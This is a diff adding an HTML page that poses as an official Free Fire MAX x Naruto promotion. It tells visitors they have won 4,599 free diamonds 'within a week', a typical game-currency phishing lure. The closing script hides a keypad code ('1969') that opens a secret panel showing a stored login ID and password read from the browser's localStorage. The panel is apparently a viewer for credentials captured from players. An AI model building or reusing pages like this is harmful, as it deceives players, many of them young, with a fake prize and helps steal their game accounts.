@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Main Page</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      background-image: url("free.jpg");
+      overflow-x: hidden;
+    }
+    header {
+      background: #0077ff00;
+      color: #000000;
+      text-align: center;
+      padding: 0px;
+      font-size: 15px;
+      border-radius: 78px;
+    }
+    main {
+      flex: 1;
+      padding: 24px;
+    }
+    footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      border-top: 1px solid #ddd;
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px;
+    }
+    .digit {
+      width: 40px;
+      height: 40px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background: #fafafa;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    #creds {
+      display: none;
+      margin-top: 20px;
+      padding: 12px;
+      background: #eaf3ff;
+      border-radius: 8px;
+    }
+
+    
+
+    /* Diamonds animation section */
+    .diamond {
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      background: linear-gradient(45deg, #00c3ff, #3b83f6);
+      clip-path: polygon(50% 0%, 100% 40%, 75% 100%, 25% 100%, 0% 40%);
+      opacity: 0.9;
+      animation: fall 6s linear infinite;
+    }
+    @keyframes fall {
+      from { transform: translateY(-10%) rotate(0deg); opacity: 1; }
+      to { transform: translateY(110vh) rotate(360deg); opacity: 0; }
+    }
+
+    .btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #0078ff;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+    }
+    .btn:hover {
+      background: #005ed1;
+    }
+
+    /* Scroll image gallery */
+    .gallery {
+      margin-top: 100vh;
+      display: flex;
+      flex-direction: column;
+      gap: 40px;
+    }
+    .gallery h1 {
+      text-align: center;
+      color: #0078ff;
+      font-size: 24px;
+    }
+    .gallery img {
+      width: 100%;
+      max-width: 800px;
+      height: auto;
+      border-radius: 12px;
+      display: block;
+      margin: auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+<header style="
+  text-align: center;
+  padding: 40px 20px;
+  background: rgba(14, 6, 6, 0);
+  color: #fff;
+  font-family: 'Arial Black', Gadget, sans-serif;
+  letter-spacing: 2px;
+">
+  <div style="font-size: 48px; font-weight: 900; margin-bottom: 10px;">
+    GARENA FREE FIRE MAX x NARUTO
+  </div>
+  <h4 style="
+    font-family: 'Cursive', 'Segoe UI', sans-serif;
+    font-size: 20px;
+    font-weight: 500;
+    color: #fff;
+    letter-spacing: 1px;
+    margin: 0;
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+  ">
+    official promo website of getting free diamond
+  </h4>
+</header>
+
+
+<main style="padding: 80px 20px; text-align: center; position: relative; overflow: hidden;">
+
+  <!-- Animated gradient heading -->
+  <h1 style="
+    font-size: 64px; 
+    font-weight: 900; 
+    background: linear-gradient(90deg, #ff5f6d, #ffc371, #42e695, #3bb2f5); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+    animation: gradientAnimation 5s ease infinite; 
+    margin-bottom: 30px;
+  ">
+    🎉 Congratulations! 🎉
+  </h1>
+
+  <!-- Subheading with bounce animation -->
+  <h2 style="
+    font-size: 36px; 
+    font-weight: 900; 
+    background: linear-gradient(90deg, #000000, #000000); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+    animation: bounce 2s infinite; 
+    margin-bottom: 25px;
+  ">
+    You have got <strong>4,599 Diamonds 💎</strong>
+  </h2>
+
+  <!-- Paragraph with fade-in -->
+  <p style="
+    font-size: 28px; 
+    font-weight: 700; 
+    background: linear-gradient(90deg, #000000, #000000); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+    animation: fadeIn 3s ease forwards; 
+    opacity: 0;
+  ">
+    You will receive them within a week.
+  </p>
+
+  <!-- Optional floating sparkles -->
+  <div id="sparkles"></div>
+
+  <style>
+    @keyframes gradientAnimation {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
+    @keyframes bounce {
+      0%, 100% {transform: translateY(0);}
+      50% {transform: translateY(-20px);}
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+
+    /* Floating sparkles effect */
+    #sparkles div {
+      position: absolute;
+      width: 12px;
+      height: 12px;
+      background: #fff;
+      border-radius: 50%;
+      opacity: 0.9;
+      animation: sparkleMove 3s linear infinite;
+    }
+
+    @keyframes sparkleMove {
+      0% {transform: translateY(0) scale(0.5);}
+      50% {transform: translateY(-200px) scale(1);}
+      100% {transform: translateY(0) scale(0.5);}
+    }
+  </style>
+
+  <script>
+    // Create floating sparkles
+    const sparklesContainer = document.getElementById('sparkles');
+    for(let i=0;i<25;i++){
+      const s = document.createElement('div');
+      s.style.left = Math.random()*100 + 'vw';
+      s.style.animationDuration = (2 + Math.random()*3) + 's';
+      s.style.width = s.style.height = (6 + Math.random()*10) + 'px';
+      sparklesContainer.appendChild(s);
+    }
+  </script>
+</main>
+
+
+
+
+
+    <div id="creds">
+      <h3>Stored Login Details</h3>
+      <p><strong>ID:</strong> <span id="cid"></span></p>
+      <p><strong>Password:</strong> <span id="cpw"></span></p>
+    </div>
+
+    <!-- Scrollable image gallery -->
+    <div class="gallery" id="gallery">
+      <h1>Photo Gallery</h1>
+
+<!-- First two PNG images -->
+<img src="1.png" alt="Photo 1">
+<img src="2.png" alt="Photo 2">
+<img src="3.jpg" alt="Photo 3">
+<img src="4.jpg" alt="Photo 4">
+<img src="5.jpg" alt="Photo 5">
+<img src="6.jpg" alt="Photo 6">
+<img src="7.jpg" alt="Photo 7">
+<img src="8.jpg" alt="Photo 8">
+<img src="9.jpg" alt="Photo 9">
+<img src="10.jpg" alt="Photo 10">
+<img src="11.jpg" alt="Photo 11">
+<img src="12.jpg" alt="Photo 12">
+<img src="13.jpg" alt="Photo 13">
+<img src="14.jpg" alt="Photo 14">
+<img src="15.jpg" alt="Photo 15">
+<img src="16.jpg" alt="Photo 16">
+<img src="17.jpg" alt="Photo 17">
+<img src="18.jpg" alt="Photo 18">
+<img src="19.jpg" alt="Photo 19">
+<img src="20.jpg" alt="Photo 20">
+<img src="21.png" alt="Photo 21">
+    </div>
+  </main>
+
+  <footer id="footer"></footer>
+
+  <script>
+    // Create floating diamonds
+    for (let i = 0; i < 25; i++) {
+      const d = document.createElement('div');
+      d.className = 'diamond';
+      d.style.left = Math.random() * 100 + 'vw';
+      d.style.animationDuration = (4 + Math.random() * 4) + 's';
+      d.style.width = d.style.height = (20 + Math.random() * 20) + 'px';
+      document.body.appendChild(d);
+    }
+
+    // Return to home (optional)
+    function goHome() {
+      window.scrollTo({top: 0, behavior: 'smooth'});
+    }
+
+    // Build digits 0–9 in footer
+    const footer = document.getElementById('footer');
+    for (let i = 0; i <= 9; i++) {
+      const b = document.createElement('button');
+      b.textContent = i;
+      b.className = 'digit';
+      b.dataset.num = i;
+      footer.appendChild(b);
+    }
+
+    const target = "1969";
+    let seq = "";
+    footer.addEventListener('click', e => {
+      const n = e.target.dataset.num;
+      if (!n) return;
+      seq += n;
+      if (seq.length > target.length) seq = seq.slice(-target.length);
+      if (seq === target) showCreds();
+    });
+
+    function showCreds() {
+      const saved = localStorage.getItem('site_login');
+      if (!saved) { alert('No login data found'); return; }
+      const { id, pw } = JSON.parse(saved);
+      document.getElementById('cid').textContent = id;
+      document.getElementById('cpw').textContent = pw;
+      document.getElementById('creds').style.display = 'block';
+      seq = "";
+    }
+  </script>
+</body>
+</html>
